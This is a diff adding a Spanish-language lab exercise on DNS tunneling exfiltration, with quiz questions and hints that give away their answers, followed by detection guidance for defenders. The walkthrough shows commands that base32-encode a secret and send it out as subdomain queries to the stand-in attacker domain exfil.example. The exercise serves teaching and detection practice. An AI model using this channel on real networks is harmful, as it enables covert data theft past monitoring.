@@ -1,0 +1,78 @@
+---
+index: 1
+title: "Exfiltra el secreto y detéctate"
+questions:
+  - id: data-exfiltration-t01-q01
+    prompt: "Codifica el blob de /secret en base32, trocéalo en labels (c1-, c2-...) y resuélvelos contra el DNS del lab. Cuando /status marque exfil_complete tendrás la flag."
+    hint: "base32 solo usa A-Z y 2-7: caracteres válidos en labels DNS. dig @127.0.0.1 -p 18153 c1-<chunk>.exfil.example (o /resolve?q=)"
+    kind: flag
+  - id: data-exfiltration-t01-q02
+    prompt: "Como SOC: tras la exfiltración, abre /detect. ¿Qué TIPO tienen las alertas generadas por tu canal? (el tipo de la primera)"
+    hint: "DNS_TUNNELING — labels largos y de alta entropía bajo un mismo dominio raro"
+    kind: text
+  - id: data-exfiltration-t01-q03
+    prompt: "Envía la flag de blue team que /detect entrega al correlar las señales."
+    hint: "La clave blue_team_flag aparece con 2+ queries de labels >= 20 chars"
+    kind: flag
+---
+
+## El canal
+
+DNS permite ~253 caracteres por nombre y 63 por label. Los datos
+codificados en base32 (solo A-Z, 2-7 — perfectamente válidos en un
+subdominio) viajan disfrazados de consultas:
+
+```
+c1-knauyrktfvdfsmrxfveu.exfil.example    ← chunk 1
+c2-4vcfkjhectbnj5heywi.exfil.example     ← chunk 2
+```
+
+El servidor autoritativo de `exfil.example` (el atacante) recibe la
+"consulta", decodifica el label y reensambla. Herramientas reales:
+`dnscat2`, `iodine`, o scripts propios como el que vas a escribir.
+
+## El ataque, paso a paso
+
+```bash
+# 1. El secreto:
+curl -s http://127.0.0.1:18112/secret
+
+# 2. Codifica y trocea (python o la shell que prefieras):
+python3 -c "
+import base64
+enc = base64.b32encode(b'SALES-FY27-INTERNAL-ONLY').decode().rstrip('=').lower()
+print([enc[i:i+20] for i in range(0, len(enc), 20)])
+"
+
+# 3. Resuelve cada chunk contra el DNS del lab:
+dig @127.0.0.1 -p 18153 c1-<chunk1>.exfil.example
+# sin dig:
+curl "http://127.0.0.1:18112/resolve?q=c1-<chunk1>.exfil.example"
+
+# 4. Comprueba el reensamblado:
+curl -s http://127.0.0.1:18112/status | jq .
+```
+
+Cuando los chunks reensamblan el secret exacto, `/status` te suelta la
+flag. Acabas de sacar datos de una red sin usar HTTP, SMTP ni ningún
+puerto "sospechoso".
+
+## El detección: el otro lado
+
+```bash
+curl -s http://127.0.0.1:18112/detect | jq .
+```
+
+Dos señales delataron el canal:
+
+1. **Labels anormalmente largos** (>20 chars) y de alta entropía bajo un
+   mismo dominio — los subdominios legítimos son cortos
+   (`www`, `api`, `mail`).
+2. **Volumen y variedad**: un host normal consulta los MISMOS dominios
+   de siempre; un túnel genera miles de nombres únicos.
+
+En un SIEM real esto se caza con: longitud media de label por dominio,
+entropy score del qname, NXDOMAIN rate, y más moderno — modelos de ML
+sobre el tráfico DNS (Cisco Umbrella, Elastic DGA rules). La defensa
+estructural: DNS egress filtering (solo el resolver corporativo puede
+consultar fuera) y monitorear TXT/NULL records hacia dominios nuevos.
